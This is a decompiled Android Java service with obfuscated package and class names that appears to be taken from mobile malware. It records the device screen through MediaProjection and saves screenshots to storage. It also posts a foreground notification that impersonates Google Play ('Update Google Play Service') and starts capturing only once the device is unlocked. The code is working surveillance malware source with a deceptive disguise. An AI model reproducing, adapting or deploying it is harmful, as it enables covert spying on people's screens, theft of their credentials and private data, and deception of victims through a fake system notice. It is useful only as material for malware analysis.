package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.annotation.TargetApi;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.Notification.Builder;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.MediaScannerConnection;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjection.Callback;
import android.media.projection.MediaProjectionManager;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.view.WindowManager;
import java.io.File;
import java.io.FileOutputStream;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.R;

public class jkeggfql extends Service {

    /* renamed from: a */
    Intent f548a;

    /* renamed from: b */
    C0034b f549b = new C0034b();

    /* renamed from: c */
    private MediaProjection f550c;
    /* access modifiers changed from: private */

    /* renamed from: d */
    public VirtualDisplay f551d;

    /* renamed from: e */
    private final HandlerThread f552e = new HandlerThread(getClass().getSimpleName(), 10);

    /* renamed from: f */
    private Handler f553f;

    /* renamed from: g */
    private MediaProjectionManager f554g;

    /* renamed from: h */
    private WindowManager f555h;

    /* renamed from: i */
    private C0087a f556i;

    /* renamed from: j */
    private int f557j;

    /* renamed from: k */
    private Intent f558k;

    /* renamed from: l */
    private Context f559l;

    /* renamed from: m */
    private Notification f560m;

    /* access modifiers changed from: private */
    @TargetApi(21)
    /* renamed from: c */
    public void m348c() {
        try {
            this.f550c = this.f554g.getMediaProjection(this.f557j, this.f558k);
            this.f556i = new C0087a(this);
            C00903 r0 = new Callback() {
                public void onStop() {
                    jkeggfql.this.f551d.release();
                }
            };
            this.f551d = this.f550c.createVirtualDisplay("andshooter", this.f556i.mo424b(), this.f556i.mo425c(), getResources().getDisplayMetrics().densityDpi, 9, this.f556i.mo423a(), null, this.f553f);
            this.f550c.registerCallback(r0, this.f553f);
        } catch (Exception e) {
            this.f549b.mo213a("error", e.getMessage());
        }
    }

    @TargetApi(21)
    /* renamed from: d */
    private void m349d() {
        this.f560m = new Builder(this.f559l).setContentTitle("Info").setContentText("Update Google Play").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f560m);
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public WindowManager mo429a() {
        return this.f555h;
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo430a(final byte[] bArr) {
        new Thread() {
            public void run() {
                File file = new File(jkeggfql.this.getExternalFilesDir(null), "screenshot.jpg");
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    fileOutputStream.write(bArr);
                    fileOutputStream.flush();
                    fileOutputStream.getFD().sync();
                    fileOutputStream.close();
                    MediaScannerConnection.scanFile(jkeggfql.this, new String[]{file.getAbsolutePath()}, new String[]{"image/jpg"}, null);
                } catch (Exception unused) {
                    jkeggfql.this.f549b.mo213a(getClass().getSimpleName().toString(), "Exception writing out screenshot");
                }
            }
        }.start();
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public Handler mo431b() {
        return this.f553f;
    }

    @TargetApi(21)
    public IBinder onBind(Intent intent) {
        throw new IllegalStateException("");
    }

    @TargetApi(21)
    public void onCreate() {
        super.onCreate();
        this.f559l = this;
        this.f554g = (MediaProjectionManager) getSystemService("media_projection");
        this.f555h = (WindowManager) getSystemService("window");
        this.f552e.start();
        this.f553f = new Handler(this.f552e.getLooper());
    }

    @TargetApi(21)
    public void onDestroy() {
        super.onDestroy();
    }

    @TargetApi(21)
    public int onStartCommand(Intent intent, int i, int i2) {
        this.f559l = this;
        this.f548a = intent;
        if (intent.getAction() == null) {
            this.f557j = intent.getIntExtra("resultCode", 1337);
            this.f558k = (Intent) intent.getParcelableExtra("resultIntent");
            if (VERSION.SDK_INT >= 26) {
                C0034b bVar = this.f549b;
                C0034b.m228a((Service) this, "Google", "Update Google Play Service");
            } else {
                m349d();
            }
            new Thread() {
                public void run() {
                    if (!((KeyguardManager) jkeggfql.this.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                        jkeggfql.this.m348c();
                    }
                }
            }.start();
        }
        return 2;
    }
}
